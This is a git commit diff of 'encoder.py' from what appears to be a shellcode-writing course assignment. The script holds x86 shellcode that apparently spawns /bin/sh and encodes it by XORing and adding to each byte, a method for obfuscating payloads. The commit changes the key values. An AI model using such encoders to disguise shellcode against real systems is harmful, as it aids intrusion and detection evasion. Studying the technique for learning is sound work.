8af5e7746e0bd867d89da938d3a81dca4268b3d3
Pal1Sec <62672762+Pal1Sec@users.noreply.github.com>
2020-03-30 18:40:09 +0200

    Update encoder.py

--- Assignment 4/encoder.py
+++ Assignment 4/encoder.py
@@ -4,21 +4,21 @@ shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x
 
 encoded = ""
 encoded2 = ""
-xor = 66
+xor = 5
 
-# XOR every byte with 66 and after that add 33 to everybyte
+# XOR every byte with 5 and after that add 3 to every byte
 
 for x in bytearray(shellcode):
 
-# XOR every byte with 66
+# XOR every byte with 5
 	byte = x ^ xor
 
 # Add 33 to every byte
 	encoded += '\\x'
-	encoded += '%02x' % (byte + 33)
+	encoded += '%02x' % (byte + 3)
 
 	encoded2 += '0x'
-	encoded2 += '%02x,' % (byte + 33)
+	encoded2 += '%02x,' % (byte + 3)
 
 print "Encoded Shellcode:"
 print encoded
